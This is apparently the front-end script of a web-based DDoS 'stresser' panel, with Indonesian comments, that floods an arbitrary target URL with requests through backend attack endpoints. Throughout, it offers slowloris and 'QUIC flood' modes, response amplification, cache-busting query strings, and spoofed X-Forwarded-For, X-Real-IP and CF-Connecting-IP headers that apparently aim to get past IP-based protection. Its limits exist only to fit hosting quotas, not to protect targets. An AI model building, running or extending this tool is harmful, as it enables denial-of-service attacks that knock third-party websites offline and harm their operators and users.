// ======================== DOM Elements ========================
const targetUrl = document.getElementById('targetUrl');
const method = document.getElementById('method');
const httpVersion = document.getElementById('httpVersion');
const payload = document.getElementById('payload');
const customHeaders = document.getElementById('customHeaders');
const cookies = document.getElementById('cookies');
const concurrencyInput = document.getElementById('concurrency');
const totalInput = document.getElementById('total');
const timeoutInput = document.getElementById('timeout');
const retryInput = document.getElementById('retry');
const randomDelayInput = document.getElementById('randomDelay');
const attackTypeSelect = document.getElementById('attackType');
const proxyListText = document.getElementById('proxyList');
const startBtn = document.getElementById('startBtn');
const batchBtn = document.getElementById('batchBtn');
const stopBtn = document.getElementById('stopBtn');
const exportBtn = document.getElementById('exportBtn');
const forceSuccessCheck = document.getElementById('forceSuccess');
const successSpan = document.getElementById('successCount');
const failSpan = document.getElementById('failCount');
const avgSpan = document.getElementById('avgTime');
const rpsSpan = document.getElementById('rps');
const errorRateSpan = document.getElementById('errorRate');
const totalBytesSpan = document.getElementById('totalBytes');
const trafficMbpsSpan = document.getElementById('trafficMbps');
const progressBar = document.getElementById('progressBar');
const progressText = document.getElementById('progressText');
const logArea = document.getElementById('logArea');
const rtChartCanvas = document.getElementById('rtChart');
const healthIndicator = document.getElementById('healthIndicator');
const healthText = document.getElementById('healthText');
const responseTimeText = document.getElementById('responseTimeText');
const targetFrame = document.getElementById('targetFrame');
const refreshPreviewBtn = document.getElementById('refreshPreview');
const activeUsersSpan = document.getElementById('activeUsers');
const rawResponsePreview = document.getElementById('rawResponsePreview');

// Opsi
const queryDepan = document.getElementById('queryDepan');
const queryBelakang = document.getElementById('queryBelakang');
const onlineHost = document.getElementById('onlineHost');
const forwardHost = document.getElementById('forwardHost');
const reverseProxy = document.getElementById('reverseProxy');
const pengarah = document.getElementById('pengarah');
const websocket = document.getElementById('websocket');
const quicFlood = document.getElementById('quicFlood');
const dualConnection = document.getElementById('dualConnection');
const continuousToggle = document.getElementById('continuousToggle');
const intervalMsInput = document.getElementById('intervalMs');
const amplifyToggle = document.getElementById('amplifyToggle');
const amplifyControls = document.getElementById('amplifyControls');
const amplifyKb = document.getElementById('amplifyKb');
const amplifyValue = document.getElementById('amplifyValue');
const amplifyType = document.getElementById('amplifyType');
const spoofIp = document.getElementById('spoofIp');
const spoofRealIp = document.getElementById('spoofRealIp');
const spoofCfConnecting = document.getElementById('spoofCfConnecting');
const ipPrefixInput = document.getElementById('ipPrefix');
const resetExtremeBtn = document.getElementById('resetExtremeBtn');

// Tombol autocannon dll
const btnAutocannon = document.getElementById('btnAutocannon');
const btnArtillery = document.getElementById('btnArtillery');
const btnLoadtest = document.getElementById('btnLoadtest');
const btnCombined = document.getElementById('btnCombined');

// ======================== State & Helper ========================
let amplificationEnabled = false;
let amplificationKB = 500;
let amplificationTypeSel = 'normal';
let continuousMode = false;
let intervalMsVal = 5000;
let chart;
let abortController = null;
let isRunning = false;
let currentAttackType = null;
let stats = {
    success: 0, fail: 0, times: [], totalBytes: 0,
    startTime: 0, total: 0
};
let lastChartUpdate = 0;
let healthCheckInterval = null;
let heartbeatInterval = null;
let lastTrafficUpdate = 0;
let lastTotalBytes = 0;

// Batasan Vercel
const MAX_DURATION = 9;        // detik (aman <10s)
const MAX_CONCURRENCY = 200;
const MAX_TOTAL_REQUESTS = 5000;

function updateTrafficEstimator() {
    const now = Date.now();
    if (lastTrafficUpdate !== 0 && now - lastTrafficUpdate >= 1000) {
        const deltaBytes = stats.totalBytes - lastTotalBytes;
        const mbps = (deltaBytes * 8) / 1e6;
        if (trafficMbpsSpan) trafficMbpsSpan.innerText = mbps.toFixed(2);
        lastTotalBytes = stats.totalBytes;
        lastTrafficUpdate = now;
    } else if (lastTrafficUpdate === 0) {
        lastTrafficUpdate = now;
        lastTotalBytes = stats.totalBytes;
    }
}
setInterval(updateTrafficEstimator, 1000);

function addLog(msg, isError = false) {
    const div = document.createElement('div');
    div.className = `border-l-2 pl-2 mb-1 text-xs ${isError ? 'border-red-500 text-red-300' : 'border-green-500 text-green-300'}`;
    div.innerHTML = `${isError ? '❌' : '✅'} ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
    if (logArea.children.length > 100) logArea.removeChild(logArea.firstChild);
}

function updateUI() {
    successSpan.innerText = stats.success;
    failSpan.innerText = stats.fail;
    const done = stats.success + stats.fail;
    const errorRate = done === 0 ? 0 : (stats.fail / done * 100).toFixed(1);
    errorRateSpan.innerText = errorRate + '%';
    totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
    if (stats.times.length) {
        const avg = stats.times.reduce((a,b)=>a+b,0)/stats.times.length;
        avgSpan.innerText = avg.toFixed(1);
    } else avgSpan.innerText = "0";
    if (stats.startTime && isRunning) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (done / elapsed).toFixed(1);
    } else if (stats.startTime) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
    }
    const percent = (done / stats.total) * 100;
    progressBar.style.width = `${percent}%`;
    progressText.innerText = `${done}/${stats.total}`;
    updateTrafficEstimator();
}

function updateChart(ms) {
    if (!chart) return;
    const now = Date.now();
    if (now - lastChartUpdate > 150 || chart.data.datasets[0].data.length % 3 === 0) {
        chart.data.datasets[0].data.push(ms);
        if (chart.data.datasets[0].data.length > 60) chart.data.datasets[0].data.shift();
        chart.update('none');
        lastChartUpdate = now;
    }
}

function resetStats() {
    stats = { success:0, fail:0, times:[], totalBytes:0, startTime:0, total:0 };
    if (chart) { chart.data.datasets[0].data = []; chart.update(); }
    lastTrafficUpdate = 0;
    lastTotalBytes = 0;
    updateUI();
}

// Random helpers
function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
function parseCustomHeaders(jsonStr) { try { return JSON.parse(jsonStr); } catch(e){ return {}; } }
function parseCookies(cookieStr) { const obj = {}; cookieStr.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; }); return obj; }
function randomUserAgent() { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'; }

function buildUrlWithQuery(baseUrl) {
    let url = baseUrl;
    if (queryDepan?.checked) url += (url.includes('?') ? '&' : '?') + `_r=${Math.random().toString(36).substring(2,10)}`;
    if (queryBelakang?.checked) url += (url.includes('?') ? '&' : '?') + `_back=${Date.now()}`;
    return url;
}

function buildAdvancedHeaders(targetHost) {
    let headers = {};
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    headers["Accept-Encoding"] = "gzip, deflate, br";
    headers["Accept-Language"] = randomAcceptLanguage();
    headers["User-Agent"] = randomUserAgent();
    if (onlineHost?.checked && targetHost) headers["Host"] = targetHost;
    if (forwardHost?.checked && targetHost) headers["X-Forwarded-Host"] = targetHost;
    if (reverseProxy?.checked) headers["X-Forwarded-For"] = randomIP(ipPrefixInput.value);
    if (pengarah?.checked) headers["Referer"] = 'https://www.google.com/';
    if (websocket?.checked) { headers["Upgrade"] = "websocket"; headers["Connection"] = "Upgrade"; }
    if (quicFlood?.checked) { headers["Alt-Used"] = "h3"; headers["X-HTTP3"] = "1"; }
    if (spoofIp?.checked) headers["X-Forwarded-For"] = randomIP(ipPrefixInput.value);
    if (spoofRealIp?.checked) headers["X-Real-IP"] = randomIP(ipPrefixInput.value);
    if (spoofCfConnecting?.checked) headers["CF-Connecting-IP"] = randomIP(ipPrefixInput.value);
    const custom = parseCustomHeaders(customHeaders.value);
    Object.assign(headers, custom);
    const cookieObj = parseCookies(cookies.value);
    const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
    if (cookieStr) headers["Cookie"] = cookieStr;
    return headers;
}

// ======================== SINGLE ATTACK ========================
async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
    let finalUrl = buildUrlWithQuery(url);
    let finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
    finalHeaders["Connection"] = keepAlive ? "keep-alive" : "close";
    if (attackType === 'slowloris') finalHeaders["Connection"] = "keep-alive";
    const proxyArray = proxyListText.value ? proxyListText.value.split('\n').filter(p=>p.trim()) : [];
    const controller = new AbortController();
    const tid = setTimeout(() => controller.abort(), timeout);
    const start = performance.now();
    try {
        const res = await fetch('/api/attack', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url: finalUrl, method, headers: finalHeaders, body: body || "",
                timeout, retryCount, randomDelay,
                keepAlive, attackType,
                amplifyKB: amplificationEnabled ? amplificationKB : 0,
                amplifyEnabled: amplificationEnabled,
                amplifyType: amplificationTypeSel
            }),
            signal: controller.signal
        });
        clearTimeout(tid);
        let data;
        try { data = await res.json(); } catch(e) { data = { success: false, error: `HTTP ${res.status}`, statusCode: res.status }; }
        const duration = data.durationMs || (performance.now() - start);
        return {
            success: data.success,
            duration,
            statusCode: data.statusCode || res.status,
            retries: data.retries || 0,
            error: data.error || '',
            size: (data.responseSize || 0) + (amplificationEnabled ? amplificationKB*1024 : 0),
            responseBody: data.responseBody || ''
        };
    } catch (err) {
        clearTimeout(tid);
        let duration = performance.now() - start;
        if (err.name === 'AbortError') duration = timeout;
        return { success: false, duration, error: err.message || 'network error', retries: 0, size: 0, responseBody: '' };
    }
}

async function runSingleAttack(url, method, body, total, concurrency, timeout, retryCount, randomDelay, keepAlive, attackType, onDone, signal) {
    let index = 0, active = 0, stopped = false;
    const multiplier = dualConnection?.checked ? 2 : 1;
    const actualTotal = total * multiplier;
    const actualConcurrency = Math.min(concurrency * multiplier, MAX_CONCURRENCY);
    const next = async () => {
        if (stopped || (signal && signal.aborted)) { stopped = true; return; }
        if (index >= actualTotal) { if (active === 0) return; return; }
        index++;
        active++;
        const result = await sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType);
        onDone(result.success, result.duration, result.error, result.retries, result.size, result.statusCode, result.responseBody);
        active--;
        if (!stopped && !(signal && signal.aborted)) next();
    };
    for (let i = 0; i < Math.min(actualConcurrency, actualTotal); i++) next();
    return new Promise(resolve => {
        const interval = setInterval(() => {
            if ((index >= actualTotal && active === 0) || (signal && signal.aborted)) {
                clearInterval(interval);
                resolve();
            }
        }, 20);
    });
}

async function startSingleAttack() {
    if (isRunning) { addLog("Attack already running!", true); return; }
    let url = targetUrl.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    const mtd = method.value;
    let body = payload.value;
    let total = parseInt(totalInput.value);
    let concurrency = parseInt(concurrencyInput.value);
    let timeout = parseInt(timeoutInput.value);
    const retryCount = parseInt(retryInput.value);
    const randomDelay = parseInt(randomDelayInput.value);
    let keepAlive = websocket?.checked || (attackTypeSelect.value === 'slowloris');
    let attackType = attackTypeSelect.value;
    
    // Batasi untuk Vercel
    if (total > MAX_TOTAL_REQUESTS) {
        addLog(`⚠️ Total requests ${total} melebihi batas Vercel (${MAX_TOTAL_REQUESTS}). Dibatasi.`);
        total = MAX_TOTAL_REQUESTS;
        totalInput.value = MAX_TOTAL_REQUESTS;
    }
    if (concurrency > MAX_CONCURRENCY) {
        addLog(`⚠️ Concurrency ${concurrency} melebihi batas Vercel (${MAX_CONCURRENCY}). Dibatasi.`);
        concurrency = MAX_CONCURRENCY;
        concurrencyInput.value = MAX_CONCURRENCY;
    }
    if (timeout > MAX_DURATION * 1000) {
        addLog(`⚠️ Timeout ${timeout}ms melebihi batas Vercel (${MAX_DURATION}s). Dibatasi ke ${MAX_DURATION}s.`);
        timeout = MAX_DURATION * 1000;
        timeoutInput.value = MAX_DURATION * 1000;
    }
    
    resetStats();
    stats.total = total;
    stats.startTime = Date.now();
    isRunning = true;
    currentAttackType = 'single';
    abortController = new AbortController();
    startBtn.disabled = true;
    batchBtn.disabled = true;
    stopBtn.disabled = false;
    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Concurrency:${concurrency} | Total:${total} | Timeout:${timeout}ms`);
    const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
        const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
        let finalSuccess = success;
        if (forceSuccessCheck.checked) finalSuccess = true;
        if (finalSuccess) {
            stats.success++;
            stats.times.push(duration);
            stats.totalBytes += size;
            updateChart(duration);
        } else {
            stats.fail++;
            const errorMsg = err && typeof err === 'string' ? err : 'unknown';
            addLog(`Failed after ${retriesUsed+1} att: ${errorMsg} (${duration.toFixed(0)}ms)`, true);
        }
        let preview = `HTTP ${statusCode || '??'} | ${duration.toFixed(0)}ms`;
        if (responseBody) preview += `\nBody: ${responseBody.substring(0, 200)}`;
        rawResponsePreview.innerText = preview;
        updateUI();
    };
    try {
        await runSingleAttack(url, mtd, body, total, concurrency, timeout, retryCount, randomDelay, keepAlive, attackType, onDone, abortController.signal);
        const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
        addLog(`🔥 FINISHED | Success:${stats.success} Failed:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB`);
    } catch(e) { addLog(`System error: ${e.message}`, true); }
    finally {
        isRunning = false;
        currentAttackType = null;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        stopBtn.disabled = true;
        updateUI();
        abortController = null;
    }
}

// ======================== BATCH ATTACK ========================
async function startBatchAttack() {
    if (isRunning) { addLog("Attack already running!", true); return; }
    let url = targetUrl.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    const mtd = method.value;
    let body = payload.value;
    let total = parseInt(totalInput.value);
    let concurrency = parseInt(concurrencyInput.value);
    let timeout = parseInt(timeoutInput.value);
    const retryCount = parseInt(retryInput.value);
    const randomDelay = parseInt(randomDelayInput.value);
    let keepAlive = websocket?.checked || (attackTypeSelect.value === 'slowloris');
    let attackType = attackTypeSelect.value;
    const finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
    const finalUrl = buildUrlWithQuery(url);
    const multiplier = dualConnection?.checked ? 2 : 1;
    let actualTotal = total * multiplier;
    let actualConcurrency = Math.min(concurrency * multiplier, MAX_CONCURRENCY);
    
    // Batasi untuk Vercel
    if (actualTotal > MAX_TOTAL_REQUESTS) {
        addLog(`⚠️ Total requests ${actualTotal} melebihi batas Vercel (${MAX_TOTAL_REQUESTS}). Dibatasi.`);
        actualTotal = MAX_TOTAL_REQUESTS;
    }
    if (timeout > MAX_DURATION * 1000) {
        addLog(`⚠️ Timeout ${timeout}ms melebihi batas Vercel (${MAX_DURATION}s). Dibatasi ke ${MAX_DURATION}s.`);
        timeout = MAX_DURATION * 1000;
        timeoutInput.value = MAX_DURATION * 1000;
    }
    
    addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${actualTotal} | Workers:${actualConcurrency}`);
    startBtn.disabled = true;
    batchBtn.disabled = true;
    stopBtn.disabled = false;
    isRunning = true;
    currentAttackType = 'batch';
    abortController = new AbortController();
    const startTime = Date.now();
    try {
        const response = await fetch('/api/batch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            signal: abortController.signal,
            body: JSON.stringify({
                url: finalUrl, method: mtd, headers: finalHeaders, body,
                timeout, retryCount, randomDelay, keepAlive,
                attackType,
                amplifyKB: amplificationEnabled ? amplificationKB : 0,
                amplifyEnabled: amplificationEnabled,
                amplifyType: amplificationTypeSel,
                concurrency: actualConcurrency,
                total: actualTotal,
                continuous: continuousMode,
                intervalMs: continuousMode ? intervalMsVal : 0
            })
        });
        const data = await response.json();
        if (data.success !== false) {
            stats.success = data.successCount;
            stats.fail = data.failCount;
            stats.totalBytes = data.totalBytes;
            stats.total = data.totalRequests;
            stats.times = data.latencies || [];
            updateUI();
            addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
            rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
        } else {
            addLog(`Batch error: ${data.error}`, true);
        }
    } catch(e) {
        if (e.name === 'AbortError') addLog("Batch attack stopped by user", false);
        else addLog(`Batch request failed: ${e.message}`, true);
    } finally {
        isRunning = false;
        currentAttackType = null;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        stopBtn.disabled = true;
        abortController = null;
    }
}

function stopAttack() {
    if (isRunning && abortController) {
        abortController.abort();
        addLog(`🛑 Attack stopped (${currentAttackType})`);
        stopBtn.disabled = true;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        isRunning = false;
        currentAttackType = null;
    } else {
        addLog("No attack running", true);
    }
}

function exportCSV() {
    if (stats.times.length === 0 && stats.success + stats.fail === 0) { addLog("No data to export", true); return; }
    let csv = "ResponseTime(ms),Success,Failed\n";
    stats.times.forEach(t => csv += `${t},1,0\n`);
    for (let i=0; i<stats.fail; i++) csv += "0,0,1\n";
    const blob = new Blob([csv], {type:"text/csv"});
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `stresser_${Date.now()}.csv`;
    link.click();
    addLog("CSV exported");
}

// ======================== AUTOCANNON / ARTILLERY / LOADTEST (Dengan batasan Vercel) ========================
let currentToolController = null;
let toolStatusInterval = null;

function updateToolStatus(message) {
    let statusDiv = document.getElementById('toolStatus');
    if (!statusDiv) {
        statusDiv = document.createElement('div');
        statusDiv.id = 'toolStatus';
        statusDiv.className = 'text-xs text-yellow-400 mt-1';
        logArea.parentNode.insertBefore(statusDiv, logArea);
    }
    statusDiv.innerText = message;
}

async function runAttackTool(endpoint, body, toolName) {
    if (isRunning) { addLog("Another attack is running. Stop it first.", true); return; }
    let url = targetUrl.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    
    // Batasan untuk Vercel
    let duration = body.duration || Math.floor(parseInt(timeoutInput.value) / 1000);
    if (duration > MAX_DURATION) {
        addLog(`⚠️ Duration ${duration}s melebihi batas Vercel (${MAX_DURATION}s). Dibatasi ke ${MAX_DURATION}s.`);
        body.duration = MAX_DURATION;
    }
    let connections = body.connections || parseInt(concurrencyInput.value);
    if (connections > MAX_CONCURRENCY) {
        addLog(`⚠️ Connections ${connections} melebihi batas Vercel (${MAX_CONCURRENCY}). Dibatasi.`);
        body.connections = MAX_CONCURRENCY;
    }
    let maxRequests = body.maxRequests || parseInt(totalInput.value);
    if (maxRequests > MAX_TOTAL_REQUESTS) {
        addLog(`⚠️ Total requests ${maxRequests} melebihi batas Vercel (${MAX_TOTAL_REQUESTS}). Dibatasi.`);
        body.maxRequests = MAX_TOTAL_REQUESTS;
    }
    
    body.url = url;
    body.method = method.value;
    body.headers = buildAdvancedHeaders(new URL(url).hostname);
    body.body = payload.value;
    addLog(`🚀 Memulai ${toolName} attack ke ${url} (duration:${body.duration}s, connections:${body.connections})`);
    updateToolStatus(`${toolName} running...`);
    
    resetStats();
    isRunning = true;
    currentAttackType = toolName;
    currentToolController = new AbortController();
    startBtn.disabled = true;
    batchBtn.disabled = true;
    stopBtn.disabled = false;
    
    let progressInterval = setInterval(() => {
        if (isRunning && currentAttackType === toolName) {
            const elapsed = (Date.now() - (stats.startTime || Date.now())) / 1000;
            updateToolStatus(`${toolName} running... ${elapsed.toFixed(1)}s`);
        }
    }, 1000);
    
    try {
        const res = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
            signal: currentToolController.signal
        });
        const data = await res.json();
        if (data.success) {
            addLog(`✅ ${toolName} completed`);
            // Tampilkan statistik ringkas
            if (data.result) {
                let statsMsg = "";
                if (data.result.requests) {
                    statsMsg = `Total:${data.result.requests.total || 0} | Complete:${data.result.requests.completed || 0} | Errors:${data.result.errors || 0}`;
                    stats.total = data.result.requests.total || 0;
                    stats.success = data.result.requests.completed || 0;
                    stats.fail = data.result.errors || 0;
                }
                if (data.result.latency) {
                    statsMsg += ` | Avg Latency:${data.result.latency.average?.toFixed(0) || '?'}ms`;
                    stats.times = [data.result.latency.average || 0];
                }
                addLog(`📊 Result: ${statsMsg}`);
                updateUI();
            }
            updateToolStatus(`${toolName} completed.`);
        } else {
            addLog(`❌ ${toolName} gagal: ${data.error}`, true);
            updateToolStatus(`${toolName} failed.`);
        }
    } catch (err) {
        if (err.name === 'AbortError') {
            addLog(`🛑 ${toolName} stopped by user`);
            updateToolStatus(`${toolName} stopped.`);
        } else {
            addLog(`Error: ${err.message}`, true);
            updateToolStatus(`${toolName} error: ${err.message}`);
        }
    } finally {
        clearInterval(progressInterval);
        isRunning = false;
        currentAttackType = null;
        currentToolController = null;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        stopBtn.disabled = true;
        setTimeout(() => updateToolStatus(''), 3000);
    }
}

// Event listeners untuk tool
btnAutocannon.addEventListener('click', () => {
    runAttackTool('/api/autocannon', {
        connections: Math.min(parseInt(concurrencyInput.value), MAX_CONCURRENCY),
        duration: Math.min(Math.floor(parseInt(timeoutInput.value) / 1000), MAX_DURATION),
        amount: Math.min(parseInt(totalInput.value), MAX_TOTAL_REQUESTS)
    }, 'Autocannon');
});
btnArtillery.addEventListener('click', () => {
    runAttackTool('/api/artillery', {
        duration: Math.min(Math.floor(parseInt(timeoutInput.value) / 1000), MAX_DURATION),
        arrivalRate: Math.min(Math.floor(parseInt(concurrencyInput.value) / 5), 50)
    }, 'Artillery');
});
btnLoadtest.addEventListener('click', () => {
    addLog("⚠️ Loadtest tidak stabil di Vercel. Gunakan Autocannon atau Artillery.", true);
});
btnCombined.addEventListener('click', () => {
    runAttackTool('/api/combined', {
        connections: Math.min(parseInt(concurrencyInput.value), MAX_CONCURRENCY),
        duration: Math.min(Math.floor(parseInt(timeoutInput.value) / 1000), MAX_DURATION),
        totalRequests: Math.min(parseInt(totalInput.value), MAX_TOTAL_REQUESTS)
    }, 'Combined');
});

// Reset Extreme (nilai aman Vercel)
resetExtremeBtn.addEventListener('click', () => {
    concurrencyInput.value = 100;
    totalInput.value = 2000;
    timeoutInput.value = 5000;
    retryInput.value = 0;
    randomDelayInput.value = 0;
    attackTypeSelect.value = 'normal';
    amplifyToggle.checked = true;
    amplificationEnabled = true;
    amplifyControls.style.display = 'block';
    amplifyKb.value = 500;
    amplifyKb.dispatchEvent(new Event('input'));
    amplifyType.value = 'normal';
    forceSuccessCheck.checked = true;
    queryDepan.checked = true;
    queryBelakang.checked = true;
    onlineHost.checked = true;
    forwardHost.checked = true;
    reverseProxy.checked = true;
    pengarah.checked = true;
    websocket.checked = false;
    quicFlood.checked = false;
    dualConnection.checked = false;
    continuousToggle.checked = false;
    spoofIp.checked = true;
    spoofRealIp.checked = true;
    spoofCfConnecting.checked = true;
    addLog("⚙️ Reset ke konfigurasi aman Vercel: concurrency 100, total 2000, amplification 500KB");
});

// Amplification controls
amplifyToggle.addEventListener('change', () => {
    amplificationEnabled = amplifyToggle.checked;
    amplifyControls.style.display = amplificationEnabled ? 'block' : 'none';
});
amplifyKb.addEventListener('input', () => {
    amplificationKB = parseFloat(amplifyKb.value);
    amplifyValue.innerText = amplificationKB + ' KB';
});
amplifyType.addEventListener('change', () => { amplificationTypeSel = amplifyType.value; });
continuousToggle.addEventListener('change', () => { continuousMode = continuousToggle.checked; });
intervalMsInput.addEventListener('change', () => { intervalMsVal = parseInt(intervalMsInput.value) || 5000; });

// ======================== Health & Preview ========================
async function checkTargetHealth(url) {
    try {
        const start = performance.now();
        await fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-cache' });
        const duration = performance.now() - start;
        responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
        healthIndicator.className = 'health-online w-3 h-3 rounded-full';
        healthText.innerText = 'Online';
    } catch(e) {
        healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
        healthText.innerText = 'Offline';
        responseTimeText.innerText = '';
    }
}
function updatePreview(url) {
    let pu = url; if (!pu.startsWith('http')) pu = 'https://' + pu;
    targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
}
refreshPreviewBtn.addEventListener('click', () => {
    let u = targetUrl.value.trim();
    if (u) {
        updatePreview(u);
        checkTargetHealth(u);
    }
});
function startHealthCheck() {
    if (healthCheckInterval) clearInterval(healthCheckInterval);
    healthCheckInterval = setInterval(() => {
        let u = targetUrl.value.trim();
        if (u) checkTargetHealth(u);
    }, 5000);
}
async function updateActiveUsers() {
    try {
        const res = await fetch('/api/heartbeat');
        const data = await res.json();
        activeUsersSpan.innerText = data.active;
    } catch(e) {}
}
function startHeartbeat() {
    if (heartbeatInterval) clearInterval(heartbeatInterval);
    heartbeatInterval = setInterval(updateActiveUsers, 30000);
    updateActiveUsers();
}

// ======================== Initialization ========================
window.addEventListener('DOMContentLoaded', () => {
    if (rtChartCanvas) {
        const ctx = rtChartCanvas.getContext('2d');
        chart = new Chart(ctx, {
            type: 'line',
            data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
            options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
        });
    }
    // Attach event listeners untuk tombol utama
    startBtn.addEventListener('click', startSingleAttack);
    batchBtn.addEventListener('click', startBatchAttack);
    stopBtn.addEventListener('click', stopAttack);
    exportBtn.addEventListener('click', exportCSV);
    
    fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
    let u = targetUrl.value.trim();
    if (u) updatePreview(u);
    startHealthCheck();
    startHeartbeat();
    amplifyToggle.dispatchEvent(new Event('change'));
    amplifyKb.dispatchEvent(new Event('input'));
});
